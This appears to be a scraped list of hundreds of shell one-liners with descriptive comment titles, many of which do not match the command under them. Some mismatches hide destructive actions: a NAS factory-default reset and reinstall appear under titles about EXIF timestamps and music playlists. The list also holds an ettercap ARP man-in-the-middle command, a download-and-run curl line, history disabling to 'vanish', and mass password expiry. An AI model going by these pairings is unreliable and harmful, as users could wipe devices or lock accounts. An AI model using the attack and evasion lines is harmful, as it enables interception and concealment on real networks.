# Kill all Zombie processes if they accept it!
kill -9 `ps -xaw -o state -o pid | grep Z | grep -v PID | awk '{print $2}'`
# Find Out My Linux Distribution Name and Version
cat /etc/issue
# Get rid from a blank display without reboot
<Ctrl><Alt><F6>  killall5
# Find Mac address
ip li | grep ether | awk '{print $2}'
# pngcrush all .png files in the directory
ls *.png | while read line; do pngcrush -brute $line compressed/$line; done
# Run a script in parrallel over ssh
pssh -h RemoteHosts.txt -P -I < ~/LocalScript.sh
# Quick syntax highlighting with multiple output formats
ls -d1 $PWD/*
# geoip information
curl -s ifconfig.me|tee >(xargs geoiplookup)
# Automatically skip bad songs in your MPD playlist.
/usr/syno/sbin/./synodsdefault --reinstall
# Generate a random password 30 characters long
openssl rand -rand /dev/urandom -base64 30
# Delete more than one month old thumbnails from home directory
find  ~/.thumbnails/ -type f -atime +30 -print0 | xargs -0 rm
# bash function to check for something every 5 seconds
function checkfor () { while :; do $*; sleep 5; done; }
# Get decimal ascii code from character
ord() { printf "%d\n" "'$1"; }
# Find all videos under current directory
find ./ -type f -print0 | xargs -0 file -iNf - | grep video | cut -d: -f1
# Show directories in the PATH, one per line
echo -e ${PATH//:/\\n}
# Adjust all EXIF timestamps in .mov by +1 hour
/usr/syno/sbin/./synodsdefault --factory-default
# Show your current network interface in use
ip r show default | awk '{print $5}'
# tar pipe to copy files, alternate to cp -Ra
(cd /orignl/path tar -cf  - . ) | (cd /dst/dir;tar -xvf -)
# Generate an XKCD #936 style 4 word passphrase (fast)
echo $(grep "^[^'A-Z]\{3,7\}$" /usr/share/dict/words|shuf -n4)
# Cleanup a (source) text file, removing trailing spaces/tabs and multiple consecutive blank lines
sed -i -e 's/[ \t]*$//;/^$/N;/\n$/D' sourcefiletocleanup
# Suspend to ram
pmi action suspend
# Monitor iptables in realtime
watch -n1 iptables -vnL
# Generate binary sequence data
printf "%x\n" $(seq 0 255) | xargs -n1 -IH echo -ne \\xH > test.dat
# Doing some floating point calculations with rounding (e.g. at the 3rd decimal)
echo '123/7' |bc -l |xargs printf "%.3f\n"
# List all Samba user name
pdbedit -w -L | awk -F":" '{print $1}'
# Print entire field if string is detected in column
awk '{ if ($column == "string") print}' file.txt
# Generate password
tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | fold -w 12 | head -n 1
# Generate a random password 30 characters long
tr -c -d "a-zA-Z0-9" </dev/urandom | dd bs=30 count=1 2>/dev/null;echo
# Show the last 20 sessions logged on the machine
last -n 20
# Watching Command
watch 'cat /proc/loadavg'
# monitor system load
tload -s 10
# find file/dir by excluding some unwanted dirs and filesystems
find . -xdev -path ./junk_dir -prune -o -type d -name "dir_name" -a -print
# Automatically connect to a host with ssh once it is online
var=host ;while ! nc -zw 1 $var 22;do sleep 1; done ; ssh user@$var
# Get your current Public IP
curl ifconfig.me
# hibernate
sudo pm-hibernate
# directory size with subdirectories, sorted list
du -m --max-depth=1 [DIR] | sort -nr
# Resolve a list of domain names to IP addresses
awk < file.name '{ system("resolveip -s " $1) }'
# nmap port scanning
nmap -v -sT 192.168.0.0/24
# Get HTTP status code with curl AND print response on new line
curl -s -o /dev/null -w "%{http_code}\n" localhost
# Retrofit a shebang to an existing script
shebang () { printf '%s\n' 0a '#!'"$1" . w | ed -s "$2" ; }
# simplest calculator
echo $[321*4]
# Testing reading speed with dd
sync; time `dd if=/dev/cciss/c0d1p1 of=/dev/null bs=1M count=10240`
# Mostly silent FLAC checking (only errors are displayed)
flac -ts *.flac
# easy C shell math calculators
alias calc 'echo "scale=4;\!*"|bc -l'; alias xcalc 'echo "\!*"|bc -l'
# colorize sequences of digits
echo abcd89efghij340.20kl|grep --color -e "[0-9]\+" -e "$"
# Display a random man page
man $(ls /bin | shuf | head -1)
# Read all the S.M.A.R.T. data from a hard disk drive
smartctl --attributes /dev/sda
# Get the /dev/disk/by-id fragment for a physical drive
ls -l /dev/disk/by-id/ | grep '/sda$' | grep -o 'ata[^ ]*'
# Auto-log commands
alias m='screen -S $$ -m script'
# draw line separator (using knoppix5 idea)
seq -s '*' 40 | tr -dc '[*\n]'
# Show a listing of open mailbox files (or whatever you want to modify it to show)
lsof | grep "/var/spool/mail/"
# Prepend a text to a file.
sed -i 's/^/ls -l /' output_files.txt
# Change timestamp on a file
touch -amct [[CC]YY]MMDDhhmm[.ss] FILE
# Use tagged vlans
sudo vconfig add eth0 [VID]
# ignore .DS_Store forever in GIT
echo .DS_Store >> ~/.gitignore
# Create a tar of directory structure only
find . -type d|xargs tar rf ~/dirstructure.tar --no-recursion
# return a titlecased version of the string
title() { string=( $@ ); echo ${string[@]^} }
# Get the IP address
ifconfig | sed -n 's/.*inet addr:\([0-9.]\+\)\s.*/\1/p'
# blktrace - generate traces of the i/o traffic on block devices
sudo blktrace -d /dev/sda -o - | blkparse -i -
# count the appearance of a word or a string  in a given webpage
wget -q -O- PAGE_URL | grep -o 'WORD_OR_STRING' | wc -w
# badblocks for floppy
/sbin/badblocks -v /dev/fd0 1440
# dhcdrop - testing/suppression/tracking false DHCP servers
sudo dhcdrop -i eth1 -y -l 00:11:22:33:44:55
# List your MACs address
ip li | grep ff
# List all symbolic links in current directory
find /was61 -type l
# Open an image in feh, automatically scaling it to its window's size
feh --scale-down --auto-zoom
# Clear current session history (bash)
history -r
# guess the filetype for a file
file file.txt
# List all symbolic links in current directory
find /was61 -type l
# check to see what is running on a specific port number
lsof -iTCP:8080 -sTCP:LISTEN
# Checkout all modified files with spaces with git
git ls-files --modified -z | xargs -0 git checkout HEAD
# SSH socket
ssh -D localhost:8090 username@serve.com -f -N
# Generate a sequence of numbers.
echo {1..12}
# bash regex match
[[ $string =~ regex ]]; : for example; [[ $string =~ --.+ ]]
# Split tsv file by fifth column ... or any column
awk -F'\t' '{print $0 >>$5.tsv}'
# List all symbolic links in current directory
find /was61 -type l
# get current git branch
git rev-parse --symbolic-full-name --abbrev-ref HEAD
# Purge configuration file of all desinstalled package
blkid
# scrot screenshot without window appearing
scrot '%Y-%m-%d_$wx$h_scrot.png'
# change file permission modes (octal notation)
chmod 644 /path/to/file
# DHCP for *NIX
ifconfig eth0 0.0.0.0 0.0.0.0 && dhclient eth dhcp
# Know your distro
lsb-release -a
# How many world writeable files on your system? (Mandriva Linux msec)
# wc -l /var/log/security/writable.today
# umount sshfs mounted directory
fusermount -u ~/sshfs_mounted_directory
# Title Case Files
rename 's/(^|[\s\(\)\[\]_-])([a-z])/$1\u$2/g' *
# Get the IP address
hostname -I
# Use top to monitor only all processes with the same name fragment 'foo'
top -p $(pgrep -f -d , foo)
# shows major directories in ascending order
du . | sort -n
# In URL converts %XX to chars
read -p "> " URL; echo -e "> `echo $URL | sed 's|%|\\\\x|g'`"
# Title Case Files
rename 's/\b([a-z])/\u$1/g' *
# print all characters of any file in human readble form using hexdump
hexdump -c <file>
# Find removed files still in use via /proc
ls -l /proc/*/fd/* | grep 'deleted'| grep "\/proc.*\file-name-part"
# Extract all IPs from a file
grep -E '([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})' -o tmp
# Monitoring file change while a copy
watch "ls -al myfile"
# Install build dependencies for a given package
sudo apt-get build-dep rhythmbox
# Find a process by name and automatically kill it
pkill -f process_name
# Merge two non-consecutive lines of a file with sed and bash
$ sed "2s/$/ $(sed -n '4p' sound.desktop)/" sound.desktop
# extract column from csv file
cut -d"," -f9
# uncomment the lines where the word DEBUG is found
sed 's/^#\(.*DEBUG\)/\1/' $FILE
# vim read stdin
ls | view -
# Show and update a log file
tail -F logfile
# move up through directories faster (set in your /etc/profile or .bash_profile)
function up { i=$1; while [ $((i--)) -gt 0 ]; do cd ../ && pwd; done }
# Generate an XKCD #936 style 4 word password
shuf -n4 /usr/share/dict/words | tr '\n' ' '
# List all symbolic links in the current directory
ls -l `find . -maxdepth 1 -type l -print`
# use a command's output as arguments for another
first_command | xargs other_command
# Remove all docker images to cleanup disk
docker rmi `docker images -a -q`
# Count repeated lines, listing them in descending order of frequency
LC_ALL=C sort file | uniq -c | sort -n -k1 -r
# List all files in current dir and subdirs sorted by size
find . -printf "%s %p\n" | sort -n
# To remove all *.swp files underneath the current directory
find . -name \*.swp -type f -delete
# checking cpu utilization (what total idle is cpu)
sar 1 3
# 16 Character Random Password
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;
# Convert unix timestamp to date
date -r 1436241882
# unblock multiple files
dir c:\mydir -Recurse | Unblock-File
# Raspberry Pi serial number w/o leading zeros
sed '$!d s/.*: 0\+//' /proc/cpuinfo
# List available upgrades from apt without upgrading the system
apt list --upgradable
# Remove all docker images to cleanup disk
docker image prune
# Merge - Concate MP3 files
lspv hdisk1
# Radom polygen subject for GnuPG mail (icedove + enigmail)
icedove --compose subject=$(polygen ~/.icedove/xxxxxxx.default/bofh.grm)
# To show which desktop environment I have installed
ls -l /usr/share/xsessions/
# Check if a port is open to the internet using canyouseeme.org
git diff $(git log --pretty=format:%h -2 --reverse | tr "\n" " ")
# change file permission modes (symbolic notation)
chmod rwxrw-r-- /path/to/file
# Number of CPU's in a system
grep -cE "^processor" /proc/cpuinfo
# Remove color codes (special characters) with sed
sed -r "s/(\x1B|\033)(\(B|\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig"
# Run last history entry based on a given command
![command]
# test connection to a remote IP / port
nc -z <IP> <TCP port>  OR   nc -zu <IP> <UDP port>
# Tracing shell scripts with time stamps
set -x && PS4='+\t '
# List open file descriptor count by PID
lsof | cut -f 1 -d ' ' | uniq -c | sort -rn | head -n 10
# Returns the current timestamp
date +%s
# Get last sleep time on a Mac
sysctl kern.sleeptime
# Find core files
find . -type f -regex ".*/core.[0-9][0-9][0-9][0-9]$"
# Copying part of the files from one directory to another
find dir1 -maxdepth 1 -type f | head -100000 | xargs mv -t dir2/subdir
# remove at jobs
atrm $(atq|cut -f1)
# type partial command, kill this command, check something you forgot, yank the command, resume typing.
dd [...] p
# Replace the Caps Lock key with Control
setxkbmap -option ctrl:nocaps
# Convert phone book VCARD to text
tr -d "\r" < file.vcf | tr "\0" " " > file.vcf.txt
# Count relevant lines of shell code in a git repo
egrep -v '^\s*($|#)' $(git grep -l '#!/bin/.*sh' *) | wc -l
# see whats getting written into all of the open logfiles under /var/log
eval `lsof +D /var/log|(read;awk '{print "tail -f " $9 " &" }'|sort|uniq)`
# Alias for displaying a process tree nicely
alias pst='pstree -Alpha'
# force change password for all user
while IFS=: read u x; do passwd -e "$u"; done < /etc/passwd
# Get the name or user running the process of specified PID
ps -p pid -o logname |tail -1
# Remove color codes (special characters) with sed
sed -r 's/'$(echo -e "\033")'\[[0-9]{1,2}(;([0-9]{1,2})?)?[mK]//g'
# Check the state of a service
sc query service_name
# Download and run script
sh -c "$(curl -fsSL <link>)"
# Read just the IP address of a device
hostname -I | awk '{print $1}'
# Generate a sequence of numbers.
seq 12
# Compile all gettext source files
find ./i18n -name "*.po" | while read f; do msgfmt $f -o ${f%.po}.mo; done
# Select a video and audio quality and merge in a mkv
youtube-dl  -f 137+22  <URL> --merge-output-format mkv
# Print the list of all files checked out by Perforce SCM
alias opened='p4 opened | awk -F# "{print \$1}"'
# grep for a list of values and list matching values NOT matching lines each time they match
rename 's/ /-/g' *.mp3
# convert single digit to double digits
for i in [0-9].ogg; do mv {,0}$i; done
# Test against loopback address with the 0.0.0.0 default route.
cat some-image.html | nc -v -l -p 12345
# lists everything inside directories in your current working dir
ls -l */
# convert WAV audio to MP3
lame -V0 -q0 --vbr-new audio.wav audio.mp3
# get with grep exact x strings matches from output
grep "^[A-Za-z0-9]\{6\}$" myfile.txt
# diff recursively, ignoring CVS control files
diff -x "*CVS*" -r <path-1> <path-2> [<path-3>]
# Show directory sizes, refreshing every 2s
watch 'find -maxdepth 1 -mindepth 1 -type d  |xargs du -csh'
# Decompress all .tar.gz files and remove the compressed .tar.gz
for i in *.tar.gz; do tar -x -v -z -f $i && rm -v $i; done
# Copy the partition table from /dev/sda to /dev/sdb
sfdisk -d /dev/sda | sudo sfdisk /dev/sdb
# split & combine a large file
split -b 500m file.gz file.gz.part-
# Convert CMYK PSD (Photoshop) file to RGBA
convert <input.psd> -channel RGBA -alpha Set -colorspace rgb <output.png>
# Show sorted list of files with sizes more than 1MB in the current dir
find . -maxdepth 1 -type f -size +1M -printf "%f:%s\n" | sort -t":" -k2
# show  tcp syn packets on all network interfaces
tcpdump -i any -n tcp[13] == 2
# Count and show duplicate file names
find . -type f  |sed "s#.*/##g" |sort |uniq -c -d
# print all characters of a file using hexdump
xxd <file>
# List image attributes from a folder of JPEG images
for file in *.jpg; do identify -format '%f %b %Q %w %h' $file; done
# identify active network connections
lsof -i -P +c 0 +M | grep -i "$1"
# Remove duplicate lines using awk
awk '!($0 in array) { array[$0]; print }' temp
# Find all Mac Address
/sbin/lspci -v | grep -i "Device Serial Number"
# Find processes blocked on IO
while [ 1 ] ;do ps aux|awk '{if ($8 ~ "D") print }'; sleep 1 ;done
# Route some ips (or domain names) over VPN
sudo /sbin/route add -host 192.168.12.50 -interface ppp0
# Find logs modified in the last 15 minutes
find /var/log -wholename "*.log" -mmin -15
# Memorable recursive directory listing
ls -ltrapR
# Kill all processes belonging to a user
sudo -u $USER kill -9 -1
# Force all processes matching argument to close.
killall -HUP argument
# Archive and compress a directory using gunzip compression
alias wgety='wget -c $(xsel)'
# Remove all untagged docker images
docker rmi $(docker images | grep "^<none>" | awk "{print $3}")
# A line across the entire width of the terminal
for ((i=0; i<$(tput cols); i++)); do echo -e "=\c" ;done
# count and number lines of output, useful for counting number of matches
ps aux | grep [h]ttpd | cat -n
# find the device when you only know the mount point
df -P | awk '$6=="/media/KINGSTON" {print $1}'
# Change the terminal  foreground color
tput setf 4
# repeat a command every x seconds
while sleep 1; do foo; done
# Move all located items to folder
docker rm $(docker ps -a -q)
# find the path of biggest used space
du -a / | sort -n -r | head -n 10
# Grep live log tailing
tail -f some_log_file.log | grep --line-buffered the_thing_i_want
# shell alternative to 'basename'
echo ${file##*/}
# Get Futurama quotations from slashdot.org servers
grep -v ^# /etc/somefile.conf | grep .
# Let you vanish in the (bash) history.
export HISTSIZE=0
# Clear the screen and list file
alias cls='clear;ls'
# Remove files unpacked by unzip
zipinfo -1 aap.zip | xargs -d '\n' rm
# Show your font name list
fc-query ./fonts/* | grep "family:" | cut -d '"' -f 2 | sort -u
# Stop all docker containers
docker stop $(docker ps -a -q)
# bash glob dot-files
shopt -s dotglob
# List only directories, one per line
ls -l | grep ^d  | sed 's:.*\ ::g'
# cd Nst subdir
cdn() { cd $(ls -1d */ | sed -n $@p); }
# securely move with rsync
alias smv="rsync --remove-source-files -varP"
# Find a file and delete it
find filename -print0 | xargs -0 rm
# display swap space used by a process
awk '/VmSwap/{print $2 " " $3}' /proc/$PID/status
# Git find branch for a file
git log --all -- '*RestSessionController*''
# Download an entire website
wget -mkEpnp example.com
# open any file or directory from shell as if clicking double click by mouse
gvfs-open
# Using graphicsmagick, over an image transform the white color to transparent background
gm convert source.png -transparent white result.png
# seconds since epoch to ISO timestamp
printf '%(%FT%T)T\n' 1606752450
# number the line of  a file
cat -n file  or cat -b file
# List only directories, one per line
find . -maxdepth 1 -mindepth 1 -type d -printf "%f\n"
# Backup all files matching a pattern to files with a timestamp
for FILE in *.conf; do cp $FILE{,.`date +%Y%m%dt%M:%H:%S`}; done
# generate a uuid
echo "import uuid\nimport sys\nsys.stdout.write(str(uuid.uuid4()))" | python
# return external ip
nslookup . ifcfg.me
# Kill all salt running processes
ps aux | grep salt | awk '{ print $2}' | xargs kill
# check squid logs for time value greater than 9000ms
cat squid.log| awk -v x=9000 '$2 >=x' | sort -hs| tail -n 100
# Show a calendar
cal [[month] year]
# Check the last 15 package operations (on yum systems)
tail -n 15 /var/log/yum.log | tac
# Replace words with sed
sed /BEGIN/,/END/s/xxx/yyy/g input.txt
# Frequency Sweep
l=500; x=500; y=200; d=-15;for i in `seq $x $d $y`; do beep -l $l -f $i;done
# skipping five lines, at top, then at bottom
seq 1 12 | sed 1,5d ; seq 1 12 | head --lines=-5
# Add another tty device using mknod command
sudo mknod /dev/ttyS4 c 4 68
# lsof - cleaned up for just open listening ports, the process, and the owner of the process
lsof -iTCP -sTCP:LISTEN
# Print all words in a file sorted by length
for a in $(< FILENAME); do echo "$(bc <<< $(wc -m<<<$a)-1) $a";done|sort -n
# Create an alias command that clears the screen and scroll back buffer (in putty and xterm)
alias clearscrollback='clear;printf %b "\033[3J"'
# Display the specified range of process information
ps aux | sort -n -k2 | awk '{if ($2 < 300) print($0)}'
# Find IPv4 addresses in files from current directory
grep -R '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' *
# shut of the screen.
!$
# Check spelling of word using regex
egrep "^compat.bility$" /usr/share/dict/words
# zgrep with colour into less
alias scd='dirs -v; echo -n "select number: "; read newdir; cd -"$newdir"'
# View the octal dump of a file
od -vt x1 /tmp/spaghettifile
# Report What Tape is in Autoloader Mailslot (using Barcode Label)
mtx -f /dev/sg13 status | grep EXPORT | cut -c 56-63
# Remove dashes in UUID
UUID="63b726a0-4c59-45e4-af65-bced5d268456"; echo ${UUID//-/}
# Removes all existing printers
lpstat -p | cut -d' ' -f2 | xargs -I{} lpadmin -x {}
# Open (in vim) all modified files in a git repository
vim `git status | grep modified | awk '{print $3}'`
# List Server IP address
ifconfig eth0 | grep inet | awk '{ print $2 }'
# grep across gzip files and sort by numeric day & time
zgrep  -i --color=always "string" files.gz | sort -k 2,3
# send files via ssh-xfer
cat somefilehere.txt | ssh-xfer nametocallfile.txt -
# cat a config file removing all comments and blank lines
grep -vh '^[[:space:]]*\(#\|$\)' <file>
# lookup a short url with curl
ls -al | grep ^d
# Top Ten of the most active committers in git repositories
git shortlog -s | sort -rn | head
# Clear RAM cache
su -c 'sync; echo 3 > /proc/sys/vm/drop_caches'
# Get name of running Window Manager
find . -name '*.js' | xargs du -bc -h | sort -k1,1 -h
# Update all git submodules
git submodule update --init --recursive
# Which files/dirs waste my disk space
du -aB1m|awk '$1 >= 100'
# Remove comments and empty lines from a file
grep -v '^#\|^$' /etc/hdparm.conf
# delete all trailing whitespace from each line in file
sed 's/[ \t]*$//' < <file> > <file>.out; mv <file>.out <file>
# Grabs Open Files and Then Greps Them
lsof | grep "stuff"
# Hibernate after 30minutes
sudo bash -c "sleep 30m; pm-hibernate"
# Speed Up WAN File Transfer With Compression
ssh 10.0.0.4 "gzip -c /tmp/backup.sql" |gunzip > backup.sql
# Resolution of a image
identify image.jpg |grep -o "[[:digit:]]*x[[:digit:]]*" |tail -1
# find file(s) on disk
find / -name 'tofind.sh' 2>/dev/null
# Run a command on all servers using func
func "*" call command run "uname -i"
# Get all files of particular type (say, mp3) listed on some web page (say, audio.org)
find . -name "*.txt" | xargs sed -i "s/old/new/"
# Set the master volume to 90% (Ubuntu)
aumix -v 90
# Sometimes you just want a quick way to find out if a certain user account is locked [Linux].
getent shadow | grep '^[^:]\+:!' | cut -d: -f1
# Get IPv4 of eth0 for use with scripts
/sbin/ifconfig eth0 | grep 'inet addr:' | awk {'print $2'} | sed 's/addr://'
# delete all leading and trailing whitespace from each line in file
sed 's/^[ \t]*//;s/[ \t]*$//' < <file> > <file>.out; mv <file>.out <file>
# list with full path
find $(pwd) -maxdepth 1 -name "*" -printf "%p\n"
# copy public key
ssh-copy-id host
# Lists all clients of a Squid proxy
awk '{a[$3]++} END {for(i in a) print i}' /var/log/squid/access.log
# This little command edits your gitignore from anywhere in your repo
vim $(git rev-parse --show-toplevel)/.gitignore
# Put files back together after encrypted with tar and ccrypt
cat file.gz.cpt *[a-z] | ccdecrypt -k yoursecretpassword | tar -xzf -
# find an X11 window by its title and highlight it
netstat -tunlapo
# Shows which commands you use the most.
cut -f1 -d" " ~/.bash_history | sort | uniq -c | sort -nr | head -n 30
# Erase Logs / Cache
end_w_nl() { [[ $(tail -c1 $1 | xxd -ps) == 0a ]] }
# quick rename
imv foo
# print man pages as html to stdout
man -Hcat ls
# Know status of Caps, Num and Scroll Lock on Netbook w/o Leds
find | vim -
# shuffle lines via bash
seq 1 9 | sort -R
# Make all GUI stuff show up on the display connected to the computer (when you're logged in via SSH)
DISPLAY=:0.0; export DISPLAY
# Capistrano deploy specific branch
cap -s branch=my_branch deploy
# Ettercap MITM
sudo ettercap -T -Q -M arp -i wlan0 // //
# shows whether your CPU supports 64bit mode
grep -q ' lm ' /proc/cpuinfo; [ $? -eq 0 ] && echo '64bit supported'
# Randomly succeeding command
ran() { [ $((RANDOM%100)) -lt ${1:-50} ]; }
# Long listing of the files.
alias ll='ls -la'
# Set a user password without passwd
echo 'user:newpassword' | chpasswd
# Watch changeable interrupts continuously
watch -n1 'cat /proc/interrupts
# Set user passwords to username from partial password file
awk -F: '{print "echo "$1" | passwd --stdin "$1}' passwd
# Monitor especific process with top
top -p `pgrep pidgin`
# git diff external without additional script
du -csh --time *|sort -n|tail
# Docker - delete unused images
docker rmi $(docker images -a -q)
# convert to jpg while keeping the file name
convert a.jpg png:a.jpg
# Join lines and separate with spaces
echo `cat file.txt`
# Batch image resize
for a in `ls`; do echo $a && convert $a -resize <Width>x<Height> $a; done
# Find duplicate dir in path
echo $PATH|tr : '\n'|sort|uniq -d
# delete all leading and trailing whitespace from each line in file
sed 's/^\s*//;s/\s*$//' -i file
# Capture screen with timer
sleep 3;import -window root output.png
# Recursively remove all empty directories
rmdir --ignore-fail-on-non-empty -p **/*(/^F)
# Batch rename and number files
docker inspect -f "{{ .NetworkSettings.IPAddress }}" $CONTAINERID
# Gets the X11 Screen resolution
stat -c %s filename
# all users with terminal sessions
ps axno user,tty | awk '$1 >= 1000 && $1 < 65530 && $2 != "?"' | sort -u
# Find out how to say the first 66 digits of pi as a word
pi 66 | number
# Puts every word from a file into a new line
sed -r 's/[ \t\r\n\v\f]+/\^J/g' INFILE > OUTFILE
# Quick Battery Power Monitor
ssh-keygen -l -f [pubkey] | cut -d ' ' -f 2 | tr -ds '\n:' ''
# Generate random number with shuf
seq 10| shuf | head -1
# rename multiple files with different name, eg converting all txt to csv
net group groupname username /add /domain
# Split up SQL dump by table
split -p 'DROP TABLE IF EXISTS' dump.sql dump.sql-
# in current directory delete all files with ending
find . -name "*.bak" -type f -delete
# Change the primary group of a user
useradd -g linux anish && id
# macports update
sudo port selfupdate ; echo '---------' ; sudo port upgrade outdated
# Print file content in reverse order
tac filename.txt
# displays an uncluttered list of the names of all variables and functions in the current environment, (without shell functions and definitions)
alias allvars=' ( set -o posix; set ) | less'
# Insert a date before the suffix of all the json files in a directory
for i in `ls`; do mv "$i" "`echo $i | sed s/.json/_20160428.json/`"; done
# shortcut to immediately view any script with less
which script | xargs less
# find examples of multiline idioms in Linux drivers source code
ack --cc -i -A4 wait_event linux/drivers | less -i # / list_empty
# Fibonacci numbers with awk
awk 'BEGIN {a=1;b=1;for(i=0;i<'${NUM}';i++){print a;c=a+b;a=b;b=c}}'
# add a particular track to a playlist by looking for a part of its file name
find `pwd` -iname *SEARCH_STRING* >> ~/PLAYLIST_NAME.m3u
# send email with attachment
mutt -s "Subject" -a attachment -- example@tutorialarena.com
# Get the file name having biggest size in directory.
ls -l| sort +4n|tail -1| awk '{print $NF}'
# Change directories using sudo
sudo bash -c "cd /PATH/TO/THE/DIRECTORY;bash"
# Run nohup background script background
nohup some_command/script.sh > /dev/null 2>&1&
# Flush purge or clear all Varnish Cache (version >= 4)
varnishadm "ban req.url ~ ."
# Get Futurama quotations from slashdot.org servers
curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p'
# see who is on this machine
w
# see the size of the downloaded traffic
watch -n 1 "echo | sudo iptables -nvL | head -1 | awk '{print \$7}'"
# Recursive chmod all *.sh files within the current directory
chmod u+x **/*.sh
# Display sorted, human readable list of file and folders sizes in your current working directory
du -had 1 | sort -h
# Find the process you are looking for minus the grepped one
pgrep -fa <pattern>
# Prepend text to a file
echo "text to prepend" | cat - file
# Bold & Normal Text Variables
BOLD=$(tput bold); NORM=$(tput sgr0)
# used like `echo`, but outputs to stderr instead of stdout
alias errcho='>&2 echo'
# Show running services (using systemctl)
systemctl --no-page -t service -a --state running --no-legend
# List wireless clients connected to an access point
iw dev ath0 station dump
# Create a directory and change into it at the same time
take dirname
# watches every second, a directory listing as it changes
while :; do clear; ls path/to/dir | wc -l; sleep 1; done
# Fast CLI Timer
time read x
# find and delete files smaller than specific size
find . -type f -size -80k -print0|xargs -0 rm
# Check if variable is a number
(($1 > 0)) && echo "var is a number"
# Read recursive directory listings at leisure
ls -lR | less
# Display specific line in a text file
sed "<line no>q;d"
# Shortcut to a lightweight detachable 'multi-windowed' terminal session
echo 'alias wm="abduco -A your_title_here dvtm -M"' >> ~/.bashrc
# Select to character in visual mode
echo $( (( $( (2**31 -1) ) - $(date +%s) )) )
# Find all dot files and directories
printf "%s\n" .*
# Set X keymap to dvorak and fix the Ctrl key.
setxkbmap dvorak '' ctrl:nocaps
# Get IPv4 of eth0 for use with scripts
ip addr show eth0 |grep 'inet\b' |awk '{print $2}' |sed  -r -e 's/\/.*?//g'
# git-rm for all deleted files, including those with space/quote/unprintable characters in their filename/path
git ls-files -z -d | xargs -0 git rm --
# display lines in /etc/passwd between line starting ...
< /etc/passwd sed -n "/^bin:/,/^lp:/p"
# Kill the process *group* containing a process named svscan (djb's daemontools)
kill -9 -$(ps x -o  "%c %r" | awk '/svscan/{print $2}')
# convert single digit to double digits
for i in '/tmp/file 1.txt' '/tmp/file 2.jpg'; do ln -s "$i" "$i LINK"; done
# Grep for non-empty lines that do not start with # (comments) or <some-char> and does not include <some-char>
grep -v -e '^$' -e '^[#\[]' -e '\/' some_file
# display colored list items in less pager
ls --color PATH | less -R
# Find Apache Root document
grep -e '^[[:blank:]]*DocumentRoot[[:blank:]]\S'
# Print lines in a text file with numbers in first column higher or equal than a value
awk '$NF >= 134000000 {print $0}' single-column-numbers.txt
# Add audio CD to xmms2 playlist
xmms2 addpls cdda://
# Archive every file in /var/logs
find /var/logs -name * | xargs tar -jcpf logs_`date +%Y-%m-%e`.tar.bz2
# Realtime clock cowsay
watch -tn1 'figlet -f slant  `date +%T` | cowsay -n -f telebears'
# Disable an interface's multicast filter for testing
ifconfig eth0 allmulti
# Wipe a directory recursively & safely
wipe -rfqQ 10 directory/
# Poor man's pomodoro timer
echo "aplay ring.wav" | at now + 25 min
# Numerically sorted human readable disk usage
du -s * | sort -n | cut -f2 | tr '\n' '\0' | xargs -0 -I {} du -sh "{}"
# [offline] Pronounce IPA (International Phonetic Alphabet)
ipa_say() { lexconvert.py --try unicode-ipa "$@" ;}
# draw line separator (using knoppix5 idea)
printf "%.s*" {1..40}; printf "\n"
# Check version of DNS Server
nslookup -q=txt -class=CHAOS version.bind NS.PHX5.NEARLYFREESPEECH.NET
# Copy current/working directory to clipboard
pwd | tr -d '\n' | xsel -b
# Creating new user with encrypted password
useradd -m -s /bin/bash -p $(mkpasswd --hash=SHA-512 password) username
# Show a running count of CLOSE_WAIT and TIME_WAIT connections for debugging network apps
watch -n5 ss \| grep -c WAIT
# sync repository and do install
sudo apt-fast update && sudo apt-fast -y dist-upgrade
# Count all [space][new line][space][new line] pattern using grep
echo $(( $(grep -c '^ $'  file_name) / 2 ))
# simple nbtstat -a equivalent/alias for linux (uses nmblookup)
alias nbtstat='nmblookup -S -U <server> -R'
# Execute ls -lah every one second
while true; do ls -lah && sleep 1; done
# format one line json to pretty json in vim
nnoremap  <leader>= :%s~\({\\|}\\|\[\\|\]\)~\r\1\r~g<cr>:%s~,"~,\r"~g<cr>ggvG=
# PulseAudio: set the volume via command line
pactl set-sink-mute 0 false ; pactl set-sink-volume 0 +5%
# for loop, counting forward for backward
for i in {1..15}; do echo $i; done
# Sum using awk
ps -ylC httpd --sort:rss | awk '{ SUM += $8 } END { print SUM/1024 }'
# Display any udp/tcp connections by process name or by process id
lsof -nP -c COMMAND | egrep -o '(TCP|UDP).*$' | sort -u
# flush stdin in bash
read -t 0.1 -N 255
# Expand shortened URLs
expandurl() { wget -S $1 2>&1 | grep ^Location; }
# Threads and processes of a user
$ ps -LF -u user
# oneliner to transfer a directory using ssh and tar
tar -vzc /path/to/cool/directory | ssh -q my_server 'tar -vzx -C /'
# scp through host in the middle
A$ scp -oProxyCommand="ssh -W %h:%p B" thefile C:destination
# get process id of command
processid=$(ps aux | grep 'nginx' | grep -v grep| awk '{print $2}')
# Open clipboard content on vim
nmap -sP your network/submask | awk "/^Host/"'{ print $2 }'
# Active Internet connections (only servers)
netstat -lnptu
# if you are working in two different directories; e.g. verifying files in your home directory; ls ~/ and you need to cd to  the /etc/directory. you can enter 'cd -' (no single quotes) to go back and forth between directories.
cd -
# Kill-Line
<control> + K
# scp through host in the middle
B$ scp -3 A:file C:file
# ip from hostname domain
getent hosts web.de | awk '{ print $1 }'
# get a random command-line-fu tip
ssh root@HOST tcpdump -iany -U -s0 -w - 'not port 22' | wireshark -k -i -
# List all symbolic links in current directory
ls -l | grep "\->"
# replace spaces in filenames with underscores
alias tasks='git grep -EI "TODO|FIXME"'
# Keyboard Macros
man bash | grep -A 9 "Keyboard Macros"
# Display the standard deviation of a column of numbers with awk
awk '{delta=$1; avg+=$1/NR;} END {print "stdev = " sqrt(((delta-avg)^2)/NR);}'
# get the resolution of desktop
tar xjvf file.tar.bz2
# List bash functions defined in .bash_profile or .bashrc
declare -F | sed 's/^declare -f //'
# Get a server's serial number or Dell service tag from within linux
sort file.txt | uniq -c | sort -k1nr -k2d
# how much time restart the wls service?
more restart_weblogic.log | grep "LISTEN" | awk '{ print $7 }' | uniq | wc -l
# List you configure's ip address in your system
ip addr list | grep global | awk '{print $7"\t"$2}'
# Compare two files and output similarities to a new file
